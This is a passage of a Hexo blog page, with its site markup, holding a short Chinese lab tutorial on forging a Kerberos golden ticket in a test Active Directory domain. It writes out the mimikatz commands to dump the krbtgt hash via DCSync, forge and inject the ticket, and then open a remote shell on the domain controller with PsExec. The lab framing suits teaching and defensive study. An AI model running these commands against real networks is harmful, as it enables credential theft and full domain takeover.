@@ -1,0 +1,298 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8" />
+    
+  <meta name="description" content="A tranquility that belongs to you only!" />
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+  <title>
+    黄金票据实现教程 |  Tranquillity
+  </title>
+  <meta name="generator" content="hexo-theme-yilia-plus">
+  
+  <link rel="shortcut icon" href="/feiji.ico" />
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<script src="/js/pace.min.js"></script>
+
+
+  
+
+  
+
+</head>
+
+</html>
+
+<body>
+  <div id="app">
+    <main class="content">
+      <section class="outer">
+  <article id="post-黄金票据实现教程" class="article article-type-post" itemscope
+  itemprop="blogPost" data-scroll-reveal>
+
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h1 class="article-title sea-center" style="border-left:0" itemprop="name">
+  黄金票据实现教程
+</h1>
+  
+
+    </header>
+    
+
+    
+    <div class="article-meta">
+      <a href="/2020/%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%AE%9E%E7%8E%B0%E6%95%99%E7%A8%8B/" class="article-date">
+  <time datetime="2020-02-13T04:40:51.000Z" itemprop="datePublished">2020-02-13</time>
+</a>
+      
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E6%95%99%E7%A8%8B/">教程</a> / <a class="article-category-link" href="/categories/%E6%95%99%E7%A8%8B/%E5%8D%9A%E5%AE%A2/">博客</a>
+  </div>
+
+      
+      
+<div class="word_count">
+    <span class="post-time">
+        <span class="post-meta-item-icon">
+            <i class="ri-quill-pen-line"></i>
+            <span class="post-meta-item-text"> 字数统计:</span>
+            <span class="post-count">447字</span>
+        </span>
+    </span>
+
+    <span class="post-time">
+        &nbsp; | &nbsp;
+        <span class="post-meta-item-icon">
+            <i class="ri-book-open-line"></i>
+            <span class="post-meta-item-text"> 阅读时长≈</span>
+            <span class="post-count">1分钟</span>
+        </span>
+    </span>
+</div>
+
+      
+    </div>
+    
+
+    
+    
+    <div class="tocbot"></div>
+
+
+
+
+
+    
+
+    <div class="article-entry" itemprop="articleBody">
+      
+
+
+      
+
+      
+      <h4 id="实验前需要准备的环境及工具："><a href="#实验前需要准备的环境及工具：" class="headerlink" title="实验前需要准备的环境及工具："></a>实验前需要准备的环境及工具：</h4><h5 id="实验工具："><a href="#实验工具：" class="headerlink" title="实验工具："></a>实验工具：</h5><ul>
+<li><p><a href="PsExec64.exe">PsExec64</a><br>PsExec工具是内网渗透中的免杀渗透利器。</p>
+</li>
+<li><p><a href="mimikatz_trunk.zip">mimikatz_trunk</a><br>mimikatz工具的功能是直接从 lsass.exe 进程里获取windows处于active状态账号的明文密码，还可以提升进程权限、注入进程、读取进程内存等等。</p>
+</li>
+</ul>
+<h5 id="实验环境："><a href="#实验环境：" class="headerlink" title="实验环境："></a>实验环境：</h5><ul>
+<li>Windows server 2008 作为域控制器，域为 yuming.com</li>
+<li>Windows 7 作为 yuming域下的一台服务器</li>
+</ul>
+<h4 id="黄金票据条件："><a href="#黄金票据条件：" class="headerlink" title="黄金票据条件："></a>黄金票据条件：</h4><ol>
+<li>域名称[AD PowerShell模块：（Get-ADDomain）.DNSRoot]</li>
+<li>域的SID 值[AD PowerShell模块：（Get-ADDomain）.DomainSID.Value]</li>
+<li>域的KRBTGT账户NTLM密码哈希</li>
+<li>伪造用户名</li>
+</ol>
+<h4 id="实验过程："><a href="#实验过程：" class="headerlink" title="实验过程："></a>实验过程：</h4><h5 id="1-获取域控制器的-krbtgt-哈希值"><a href="#1-获取域控制器的-krbtgt-哈希值" class="headerlink" title="1. 获取域控制器的 krbtgt 哈希值"></a>1. 获取域控制器的 krbtgt 哈希值</h5><p>通过 mimikatz 输入命令获取 ktbtgt 的哈希值：lsadump::dcsync /domain:test.com /user:krbtgt<br>也可以通过wce、gethashes等方式获取。<br><img src="/2020/%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%AE%9E%E7%8E%B0%E6%95%99%E7%A8%8B/%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE-1.png" alt></p>
+<h5 id="2-伪造票据（低权限域用户在客户端上伪造）"><a href="#2-伪造票据（低权限域用户在客户端上伪造）" class="headerlink" title="2. 伪造票据（低权限域用户在客户端上伪造）"></a>2. 伪造票据（低权限域用户在客户端上伪造）</h5><p>得到 KRBTGT HASH 之后使用 mimikatz 中的 kerberos::golden 功能生成金票 golden.kiribi，即为伪造成功的TGT。<br>参数说明：<br>/admin:伪造的用户名<br>/domain:域名称<br>/sid:SID 值，域的SID<br>/krbtgt:krbtgt 的 NTLM-HASH 值<br>/ticket:生成的票据名称<br>生成金票命令：kerberos::golden /admin:administrator /domain:test.com /sid:S-1-5-21-593020204-2933201490-533286667 /krbtgt:8894a0f0182bff68e84bd7ba767ac8ed /ticket:golden.kiribi<br><img src="/2020/%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%AE%9E%E7%8E%B0%E6%95%99%E7%A8%8B/%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE-2-1.png" alt><br><img src="/2020/%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%AE%9E%E7%8E%B0%E6%95%99%E7%A8%8B/%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE-2-2.png" alt></p>
+<h5 id="3-获取权限"><a href="#3-获取权限" class="headerlink" title="3. 获取权限"></a>3. 获取权限</h5><p>清空本地票据缓存，导入伪造的票据<br>查看本地保存的票据，观察Client name：kerberos::list<br>清理本地票据缓存：kerberos::purge<br>导入伪造的黄金票据：kerberos::ptt golden.kiribi<br>查看本地保存的票据，观察Client name：kerberos::list<br>票据20分钟内有效，过期之后可以再次导入<br><img src="/2020/%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%AE%9E%E7%8E%B0%E6%95%99%E7%A8%8B/%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE-3-1.png" alt><br><img src="/2020/%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%AE%9E%E7%8E%B0%E6%95%99%E7%A8%8B/%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE-3-2.png" alt><br><img src="/2020/%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%AE%9E%E7%8E%B0%E6%95%99%E7%A8%8B/%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE-3-3.png" alt><br><img src="/2020/%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%AE%9E%E7%8E%B0%E6%95%99%E7%A8%8B/%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE-3-4.png" alt></p>
+<h5 id="4-利用伪造的黄金票据"><a href="#4-利用伪造的黄金票据" class="headerlink" title="4. 利用伪造的黄金票据"></a>4. 利用伪造的黄金票据</h5><p>直接利用psexec.exe远程登录和执行命令<br>Whoami显示当前用户为 yuming域的administrator用户<br>PsExec.exe \域控计算机名 cmd.exe<br><img src="/2020/%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%AE%9E%E7%8E%B0%E6%95%99%E7%A8%8B/%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE-4.png" alt></p>
+
+      
+      <!-- 打赏 -->
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2020/%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%AE%9E%E7%8E%B0%E6%95%99%E7%A8%8B/" data-id="ck6k9csz7000160wrez0j3yj2"
+        class="article-share-link">Share</a>
+      
+    </footer>
+
+  </div>
+
+  
+  
+  <nav class="article-nav">
+    
+    
+      <a href="/2020/%E8%AF%BE%E6%97%B602-Web%E5%B8%B8%E8%A7%81%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%8F%8A%E9%98%B2%E8%8C%83-SQL%E6%B3%A8%E5%85%A5-%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF/" class="article-nav-link">
+        <strong class="article-nav-caption">下一篇</strong>
+        <div class="article-nav-title">课时02-Web常见安全漏洞原理及防范-SQL注入-解题思路</div>
+      </a>
+    
+  </nav>
+
+
+  
+
+  
+  
+  
+
+  
+  
+  
+
+</article>
+</section>
+      <footer class="footer" display=none>
+</footer>
+    <div class="to_top">
+        <div class="totop" id="totop">
+  <i class="ri-arrow-up-line"></i>
+</div>
+      </div>
+    </main>
+    
+    <aside class="sidebar">
+      
+        <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+  <div class="logo">
+    <a href="/"><img src="/images/feiji.png" alt="Tranquillity"></a>
+  </div>
+  
+  <ul class="nav nav-main">
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/">主页</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/archives">目录</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/categories">分类</a>
+    </li>
+    
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      
+      <a class="nav-item-link nav-item-search"  title="Search">
+        <i class="ri-search-line"></i>
+      </a>
+      
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+      </aside>
+      <div id="mask"></div>
+
+<!-- #reward -->
+<div id="reward">
+  <span class="close"><i class="ri-close-line"></i></span>
+  <p class="reward-p"><i class="ri-cup-line"></i>请我喝杯咖啡吧~</p>
+  <div class="reward-box">
+    
+    <div class="reward-item">
+      <img class="reward-img" src="/images/alipay.jpg">
+      <span class="reward-type">支付宝</span>
+    </div>
+    
+    
+    <div class="reward-item">
+      <img class="reward-img" src="/images/wechat.jpg">
+      <span class="reward-type">微信</span>
+    </div>
+    
+  </div>
+</div>
+      
+<script src="/js/jquery-2.0.3.min.js"></script>
+
+
+<script src="/js/jquery.justifiedGallery.min.js"></script>
+
+
+<script src="/js/lazyload.min.js"></script>
+
+
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+  
+<script src="/js/tocbot.min.js"></script>
+
+  <script>
+    // Tocbot_v4.7.0  http://tscanlin.github.io/tocbot/
+    tocbot.init({
+      tocSelector: '.tocbot',
+      contentSelector: '.article-entry',
+      headingSelector: 'h1, h2, h3, h4, h5, h6',
+      hasInnerContainers: true,
+      scrollSmooth: true,
+      positionFixedSelector: '.tocbot',
+      positionFixedClass: 'is-position-fixed',
+      fixedSidebarOffset: 'auto',
+			onClick: (e) => {
+      	document.getElementById(e.target.innerText).scrollIntoView()
+      	return false;
+    	}
+    });
+  </script>
+
+
+<script>
+  var ayerConfig = {
+    mathjax: 
+  }
+</script>
+
+
+<script src="/js/ayer.js"></script>
+
+
+<script src="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.js"></script>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.css">
+
+
+
+<script type="text/javascript" src="https://js.users.51.la/20544303.js"></script>
+  
+  
+
+  </div>
+</body>
+
+</html>
